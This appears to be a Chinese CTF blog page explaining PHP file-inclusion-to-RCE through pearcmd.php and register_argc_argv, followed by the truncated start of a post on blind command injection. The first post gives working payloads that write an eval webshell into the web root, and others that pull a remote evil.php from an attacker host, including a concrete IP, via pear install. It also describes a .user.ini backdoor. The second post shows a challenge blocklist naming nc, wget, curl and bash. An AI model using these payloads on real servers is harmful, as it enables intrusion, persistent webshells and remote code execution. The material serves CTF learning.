+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/">Pear命令读文件</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-10-18</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="Pear命令读文件">
+          <a href="#Pear命令读文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pear命令读文件" class="headerlink" title="Pear命令读文件"></a>Pear命令读文件</h1>
+      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\image-20231017185626227.png"></p>
+<blockquote>
+<p> payload:+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd&amp;&#x2F;<?=eval($_POST[1])?>+&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php </p>
+</blockquote>
+<pre><code>不同的系统pearcmd存放的位置好像不一定， 有的在/usr/share/php/pearcmd.php。
+
+关于payload的解释： config-create是pearcmd.php的参数，用于创建默认配置文件。
+
+这个命令需要两个参数，根路径和文件名。所以payload是利用该参数将&lt;?php eval($_POST[1])?&gt;写入到/var/www/html/a.php文件中。
+</code></pre>
+
+        <h1 id="registerargcargv与include-to-RCE的巧妙组合-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv与include-to-rce的巧妙组合">
+          <a href="#registerargcargv与include-to-RCE的巧妙组合-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv与include-to-rce的巧妙组合" class="heading-link"><i class="fas fa-link"></i></a><a href="#registerargcargv与include-to-RCE的巧妙组合-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv与include-to-rce的巧妙组合" class="headerlink" title="registerargcargv与include to RCE的巧妙组合[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#registerargcargv与include-to-rce的巧妙组合)"></a>register<em>argc</em>argv与include to RCE的巧妙组合[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#registerargcargv与include-to-rce的巧妙组合)</h1>
+      <p>引子是巅峰极客2020的<strong>Meow World</strong>,题目总结下来只有一句话:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include $_GET[&#x27;f&#x27;].&quot;.php&quot;;</span><br></pre></td></tr></table></div></figure>
+
+<p>真的是开局一个include,getshell全靠猜,比赛时提示register<em>argc</em>argv,但没做出来,赛后看了别人的wp和总结,自己也打算写一个小结.</p>
+
+        <h2 id="registerargcargv-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv">
+          <a href="#registerargcargv-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv" class="heading-link"><i class="fas fa-link"></i></a><a href="#registerargcargv-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv" class="headerlink" title="registerargcargv[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#registerargcargv)"></a>register<em>argc</em>argv[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#registerargcargv)</h2>
+      <p>首先了解到这个参数默认是On的:</p>
+<img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082433.png" style="zoom:75%;">
+
+<p>但是经过后来测试发现但凡配置了php.ini的php里都会显示声明该参数为Off,那么这个参数是用来做什么的呢?</p>
+<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082507.png"></p>
+<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082516.png"></p>
+<p>这里介绍了register<em>argc</em>argv的作用,当这个参数开启的时候,php会注册argc和argv这个全局变量,并且通过第二个图可知我们可以从$_SERVER[‘argv’] 中获取到这些值.</p>
+<p>这里就要知道php作为一种脚本语言,当然可以用于编写命令行脚本,而我们可以在脚本中直接访问 argv ,argc 这两个全局变量.</p>
+<p>这里实际测试下载register<em>argc</em>argv开启的情况下_SERVER[‘argv’]与argv的值:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_SERVER[&#x27;argv&#x27;]);</span><br><span class="line">var_Dump($argv);</span><br></pre></td></tr></table></div></figure>
+
+<p>网页端中:</p>
+<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082551.png"></p>
+<p>命令行模式下:</p>
+<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082610.png"></p>
+<p>而在register<em>argc</em>argv关闭的情况下,$_SERVER[‘argv’]不会拿到任何取值</p>
+
+        <h2 id="pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear">
+          <a href="#pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear" class="heading-link"><i class="fas fa-link"></i></a><a href="#pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear" class="headerlink" title="pear[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#pear)"></a>pear[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#pear)</h2>
+      <p>接下来就要介绍pear这个命令,简介如下:</p>
+
+        <h3 id="pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear-1">
+          <a href="#pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear-1" class="headerlink" title="pear[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#pear_1)"></a>pear[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#pear_1)</h3>
+      <p>Pear 是 PHP 扩展与应用库（the PHP Extension and Application Repository）的缩写，是一个 PHP 扩展及应用的一个代码仓库。Pear 仓库代码是以包（package）分区，每一个 <code>Pear package</code> 都是一个独立的项目有着自己独立的开发团队、版本控制、文档和其他包的依赖关系信息。Pear package 以 phar、tar 或 zip 发布。</p>
+<p>既然是个包管理器,那么就应该存在下载和安装包的功能,那么pear命令是如何实现的呢?</p>
+<p>实际上pear命令是sh脚本,源码如下:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line"># first find which PHP binary to use</span><br><span class="line">if test &quot;x$PHP_PEAR_PHP_BIN&quot; != &quot;x&quot;; then</span><br><span class="line">  PHP=&quot;$PHP_PEAR_PHP_BIN&quot;</span><br><span class="line">else</span><br><span class="line">  if test &quot;/usr/local/bin/php&quot; = &#x27;@&#x27;php_bin&#x27;@&#x27;; then</span><br><span class="line">    PHP=php</span><br><span class="line">  else</span><br><span class="line">    PHP=&quot;/usr/local/bin/php&quot;</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># then look for the right pear include dir</span><br><span class="line">if test &quot;x$PHP_PEAR_INSTALL_DIR&quot; != &quot;x&quot;; then</span><br><span class="line">  INCDIR=$PHP_PEAR_INSTALL_DIR</span><br><span class="line">  INCARG=&quot;-d include_path=$PHP_PEAR_INSTALL_DIR&quot;</span><br><span class="line">else</span><br><span class="line">  if test &quot;/usr/local/lib/php&quot; = &#x27;@&#x27;php_dir&#x27;@&#x27;; then</span><br><span class="line">    INCDIR=`dirname $0`</span><br><span class="line">    INCARG=&quot;&quot;</span><br><span class="line">  else</span><br><span class="line">    INCDIR=&quot;/usr/local/lib/php&quot;</span><br><span class="line">    INCARG=&quot;-d include_path=/usr/local/lib/php&quot;</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exec $PHP -C -q $INCARG -d date.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=&quot;&quot; -d safe_mode=0 -d register_argc_argv=&quot;On&quot; -d auto_prepend_file=&quot;&quot; -d auto_append_file=&quot;&quot; $INCDIR/pearcmd.php &quot;$@&quot;</span><br></pre></td></tr></table></div></figure>
+
+<p>通过看最后一行可以知道其实它是通过php调用了pearcmd.php,那么pearcmd.php中$argv是从哪里来的呢,通过简单查找可以看到其调用了另一个php文件中某个类方法:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require_once &#x27;Console/Getopt.php&#x27;;</span><br><span class="line">/* ... */</span><br><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br></pre></td></tr></table></div></figure>
+
+<p>再次跟进Console&#x2F;Getopt.php,找到该方法的实现:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static function readPHPArgv()</span><br><span class="line">    &#123;</span><br><span class="line">        global $argv;</span><br><span class="line">        if (!is_array($argv)) &#123;</span><br><span class="line">            if (!@is_array($_SERVER[&#x27;argv&#x27;])) &#123;</span><br><span class="line">                if (!@is_array($GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;])) &#123;</span><br><span class="line">                    $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;;</span><br><span class="line">                    return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg);</span><br><span class="line">                &#125;</span><br><span class="line">                return $GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;];</span><br><span class="line">            &#125;</span><br><span class="line">            return $_SERVER[&#x27;argv&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        return $argv;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>可以看到获取$argv的方式是<code>global $argv --&gt; $_SERVER[&#39;argv&#39;] --&gt; $GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;]</code></p>
+<p>同时我们知道当我们include一个可以被php解析的文件的时候,php代码会被自动执行,这样在register<em>argc</em>argv开启的情况下我们就有可能通过包含pearcmd.php与操控$_SERVER[‘argv’]来执行pear命令</p>
+
+        <h3 id="pear命令任意文件下载-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear命令任意文件下载">
+          <a href="#pear命令任意文件下载-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear命令任意文件下载" class="heading-link"><i class="fas fa-link"></i></a><a href="#pear命令任意文件下载-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear命令任意文件下载" class="headerlink" title="pear命令任意文件下载[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#pear命令任意文件下载)"></a>pear命令任意文件下载[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#pear命令任意文件下载)</h3>
+      <p>我们先来看看如何通过pear命令来实现任意文件下载:</p>
+<ol>
+<li><p>在目录下创建一个tmp.php<br> <img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082631.png"></p>
+</li>
+<li><p>使用python一句话开启http服务器:<code>python -m SimpleHTTPServer 8080</code></p>
+</li>
+<li><p>通过执行<code>pear</code>命令获取帮助,发现存在download选项,尝试执行<code>pear download http://127.0.0.1:8080/tmp.php</code>,可以看到已经成功在当前目录下载了tmp.php:<br> <img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082702.png"></p>
+</li>
+<li><p>有没有办法控制下载目录?答案是使用install -R而非download,尝试执行<code>pear install -R /var/www/html http://127.0.0.1:8080/tmp.php</code></p>
+<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082751.png"></p>
+</li>
+<li><p>成功下载到web目录下并能够访问<br> <img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082843.png"></p>
+</li>
+</ol>
+
+        <h3 id="如何控制-SERVER-‘argv’-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-如何控制-serverargv">
+          <a href="#如何控制-SERVER-‘argv’-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-如何控制-serverargv" class="heading-link"><i class="fas fa-link"></i></a><a href="#如何控制-SERVER-‘argv’-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-如何控制-serverargv" class="headerlink" title="如何控制$_SERVER[‘argv’][#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#如何控制_serverargv)"></a>如何控制$_SERVER[‘argv’][#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#如何控制_serverargv)</h3>
+      <p>如何往$_SERVER[‘argv’]传入2个或以上的参数?测试一下:</p>
+<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082904.png"></p>
+<p>并不能通过&amp;作为$_SERVER[‘argv’]的分割,通过查阅资料和阅读源码:</p>
+<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082919.png"></p>
+<p>main&#x2F;php_variables.c  </p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI void php_build_argv(const char *s, zval *track_vars_array)</span><br><span class="line">&#123;</span><br><span class="line">zval arr, argc, tmp;</span><br><span class="line">int count = 0;</span><br><span class="line">if (!(SG(request_info).argc || track_vars_array)) &#123;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">array_init(&amp;arr);</span><br><span class="line">/* Prepare argv */</span><br><span class="line">if (SG(request_info).argc) &#123; /* are we in cli sapi? */</span><br><span class="line">int i;</span><br><span class="line">for (i = 0; i &lt; SG(request_info).argc; i++) &#123;</span><br><span class="line">ZVAL_STRING(&amp;tmp, SG(request_info).argv[i]);</span><br><span class="line">if (zend_hash_next_index_insert(Z_ARRVAL(arr), &amp;tmp) == NULL) &#123;</span><br><span class="line">zend_string_efree(Z_STR(tmp));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else if (s &amp;&amp; *s) &#123;</span><br><span class="line">while (1) &#123;</span><br><span class="line">const char *space = strchr(s, &#x27;+&#x27;);</span><br><span class="line">/* auto-type */</span><br><span class="line">ZVAL_STRINGL(&amp;tmp, s, space ? space - s : strlen(s));</span><br><span class="line">count++;</span><br><span class="line">if (zend_hash_next_index_insert(Z_ARRVAL(arr), &amp;tmp) == NULL) &#123;</span><br><span class="line">zend_string_efree(Z_STR(tmp));</span><br><span class="line">&#125;</span><br><span class="line">if (!space) &#123;</span><br><span class="line">break;</span><br><span class="line">&#125; s</span><br><span class="line">= space + 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>可以知道argv通过query_string取值,并通过+作为分割符,尝试一下:</p>
+<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082954.png"></p>
+
+        <h2 id="回到题目-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-回到题目">
+          <a href="#回到题目-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-回到题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#回到题目-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-回到题目" class="headerlink" title="回到题目[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#回到题目)"></a>回到题目[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#回到题目)</h2>
+      <p>现在回到题目,我们所有的拼图已经凑齐了,假如存在以下环境:</p>
+<ul>
+<li>安装了pear</li>
+<li>开启了register<em>argc</em>argv</li>
+<li>存在可控的<code>include $_GET[&#39;f&#39;]</code>(即使是<code>include $_GET[&#39;f&#39;].php</code>)</li>
+</ul>
+<p>那么我们就可以通过上面的知识实现任意文件下载从而getshell:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//通过本地直接写入webshell,注意这里最好抓包然后用burpsuite或者直接curl执行，否则浏览器会将&lt; ? &gt; 转义</span><br><span class="line">// config-create可以直接创建配置文件，且第一个参数必须以/开头</span><br><span class="line">http://ip:port/include.php?f=pearcmd&amp;+config-create+/&lt;?=phpinfo();?&gt;+/tmp/evil.php</span><br><span class="line">// 通过远程直接下载webshel</span><br><span class="line">// web目录可写</span><br><span class="line">- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php</span><br><span class="line">- http://ip:port/tmp/pear/download/evil.php</span><br><span class="line">// tmp目录可写</span><br><span class="line">- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php</span><br><span class="line">- http://ip:port/include.php?f=/tmp/pear/download/evil</span><br></pre></td></tr></table></div></figure>
+
+<p>&amp;+install+-R+&#x2F;tmp+<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://162.14.65.110:8888/1.php">http://162.14.65.110:8888/1.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="后门-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-后门">
+          <a href="#后门-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-后门" class="heading-link"><i class="fas fa-link"></i></a><a href="#后门-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-后门" class="headerlink" title="后门[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#后门)"></a>后门[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#后门)</h2>
+      <p>前面提到register<em>argc</em>argv是PHP INI PERDIR的,所以我们可以通过新建一个.user.ini设置register<em>argc</em>argv为On用于留后门</p>
+
+        <h2 id="最后-docker-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-最后docker">
+          <a href="#最后-docker-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-最后docker" class="heading-link"><i class="fas fa-link"></i></a><a href="#最后-docker-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-最后docker" class="headerlink" title="最后:docker[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#最后docker)"></a>最后:docker[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#最后docker)</h2>
+      <p>在php官方提供的镜像下,默认是不使用php.ini的(在&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php中存在php.ini-production和php.ini-development,需要手动修改任意一个文件名为php.ini才会启动php.ini,而上面我们提到在php.ini中register<em>argc</em>argv都设置为Off)</p>
+<p>而register<em>argc</em>argv在不设置的情况下默认为On,那么假如有一个默认的docker-php环境,并存在可控的<code>include $_GET[&#39;f&#39;]</code>(即使是include $_GET[‘f’].php),我们就可以利用这个漏洞实现getshell</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/10/17/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9B%B2%E6%B3%A8%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/">命令注入盲注读取文件</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-10-17</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-10-30</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="命令注入盲注读取文件">
+          <a href="#命令注入盲注读取文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#命令注入盲注读取文件" class="headerlink" title="命令注入盲注读取文件"></a>命令注入盲注读取文件</h1>
+      <p>这实际上是有2道题，但是源码一样，权限不一样。</p>
+<p>源码：</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span 